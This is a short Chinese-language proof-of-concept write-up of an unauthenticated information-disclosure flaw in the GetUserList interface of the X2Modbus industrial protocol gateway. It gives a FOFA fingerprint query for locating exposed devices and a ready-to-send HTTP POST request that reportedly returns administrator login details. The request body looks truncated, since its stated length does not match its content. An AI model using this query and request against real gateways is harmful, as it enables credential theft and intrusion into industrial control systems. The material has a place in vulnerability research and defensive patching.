# 上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露

# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。X2Modbus网关GetUserList接口存在一个信息泄漏漏洞，使得未经授权的用户或攻击者可以获取管理员登录信息。

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征

![1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936.png](./img/5pAm6LDi9QkvfYif/1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936-178259.png)

# 四、漏洞复现
```java
POST /soap/GetUserList HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

CmpWc=
```

![1712507467332-2db34223-b5c6-42d5-bd22-5afb39b57c72.png](./img/5pAm6LDi9QkvfYif/1712507467332-2db34223-b5c6-42d5-bd22-5afb39b57c72-368876.png)



> 更新: 2024-04-16 16:50:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/twhz9rc6wex3xe15>